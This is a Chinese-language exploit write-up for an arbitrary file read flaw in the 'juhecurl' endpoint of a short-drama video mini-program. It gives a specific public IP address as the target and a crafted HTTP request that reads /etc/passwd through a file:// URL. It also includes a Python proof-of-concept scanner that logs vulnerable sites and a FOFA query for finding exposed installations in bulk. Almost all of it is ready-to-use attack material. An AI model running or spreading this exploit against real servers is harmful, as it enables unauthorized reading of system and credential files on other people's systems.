## 短剧影视小程序前台juhecurl任意文件读取漏洞

### 一、地址

```
https://50.19.84.130/
```

### 二、验证

抓包

![image-20240902183043992](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240902183043992.png)

### 三、存在漏洞

改包

```
GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240902183115368](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240902183115368.png)

### 四、POC

```
def poc(target):
    payload = "/api/ems/juhecurl?url=file:///etc/passwd"
    headers = {
        "Host": "127.0.0.1",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/101.0.4951.54Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload,verify=False,headers=headers,timeout=5)
            # print(res2.text)
            if "root" in res2.text:
                print(f"该[+]网站{target}存在任意文件读取漏洞")
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站{target}存在问题，请手工测试！！")
    except Exception as e:
        print(e)
```



### 五、资产搜索

```
fofa   ：     "/VwmRIfEYDH.php"
```





